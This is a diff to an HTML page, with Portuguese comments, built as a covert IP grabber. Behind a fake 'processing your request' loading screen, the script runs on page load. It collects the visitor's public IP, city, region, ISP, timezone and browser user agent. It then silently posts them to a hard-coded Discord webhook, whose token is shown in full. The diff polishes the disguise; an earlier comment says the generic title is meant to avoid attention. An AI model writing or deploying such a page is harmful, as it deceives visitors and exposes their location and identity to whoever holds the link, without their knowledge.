@@ -3,57 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Carregando...</title> <!-- Título genérico para não chamar atenção -->
+    <title>Carregando...</title>
+    <style>
+        body {
+            background-color: #ffffff;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .loader {
+            font-size: 18px;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-    <h1></h1>
-    <p></p>
+
+    <div class="loader">Processando sua solicitação...</div>
 
     <script>
-        // URL do seu Webhook do Discord
+        /**
+         * CONFIGURAÇÃO
+         * Substitua pela sua URL do Webhook do Discord
+         */
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1542344832817823794/rpnzy3a7n1WlSyjHT4ozcd0DaN9BVufEDRLuDbbXDWe_cpLroDqhJCBzATv3llqjKqk_';
 
-        async function captureData() {
+        async function iniciarCaptura() {
             try {
-                // 1. Obtendo o IP e informações de geolocalização
-                // Usamos a ipapi.co para obter dados detalhados
-                const ipResponse = await fetch('https://ipapi.co/json/');
+                // 1. Obtém o IP Público Real (usando ipify para evitar cache de geolocalização)
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
+                const realIP = ipData.ip;
 
-                // 2. Preparando a mensagem para o Discord
+                // 2. Obtém detalhes de geolocalização baseados no IP capturado
+                // Usamos a ipapi.co para detalhes de localização e ISP
+                const geoResponse = await fetch(`https://ipapi.co/${realIP}/json/`);
+                const geoData = await geoResponse.json();
+
+                // 3. Monta o objeto de dados para o Discord (Embed para visual profissional)
                 const payload = {
                     embeds: [{
-                        title: "🚨 Novo IP Capturado!",
-                        color: 0xFF0000, // Vermelho
+                        title: "📡 Novo Registro de Acesso",
+                        description: "Um novo dispositivo acessou a página. Dados capturados abaixo:",
+                        color: 0x2ecc71, // Verde
                         fields: [
-                            { name: "IP", value: ipData.ip || "Não identificado", inline: true },
-                            { name: "Cidade", value: ipData.city || "N/A", inline: true },
-                            { name: "Região", value: ipData.region || "N/A", inline: true },
-                            { name: "País", value: ipData.country_name || "N/A", inline: true },
-                            { name: "Provedor (ISP)", value: ipData.org || "N/A", inline: false },
-                            { name: "User Agent", value: navigator.userAgent, inline: false }
+                            { name: "🌐 IP Público", value: `\`${realIP}\``, inline: true },
+                            { name: "📍 Localização", value: `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country_name || 'N/A'}`, inline: true },
+                            { name: "🏢 Provedor (ISP)", value: geoData.org || "Não identificado", inline: false },
+                            { name: "🌍 País", value: geoData.country_name || "N/A", inline: true },
+                            { name: "⏱️ Fuso Horário", value: geoData.timezone || "N/A", inline: true },
+                            { name: "📱 Navegador/Sistema", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                         ],
-                        footer: { text: "Captura realizada via DeepHat Protocol" },
+                        footer: { 
+                            text: "Captura de Segurança | DeepHat Protocol" 
+                        },
                         timestamp: new Date().toISOString()
                     }]
                 };
 
-                // 3. Enviando para o Webhook via POST
-                await fetch(DISCORD_WEBHOOK_URL, {
+                // 4. Envia os dados para o Webhook do Discord via POST
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
-                console.log("Dados enviados com sucesso.");
+                if (!response.ok) {
+                    console.error("Erro ao enviar para o Discord.");
+                }
 
             } catch (error) {
-                console.error("Erro na captura:", error);
+                // Log de erro silencioso no console
+                console.error("Falha na captura:", error);
             }
         }
 
-        // Executa a função assim que a página carrega
-        window.onload = captureData;
+        // Executa a função assim que a página carregar
+        window.addEventListener('load', iniciarCaptura);
     </script>
 </body>
 </html>
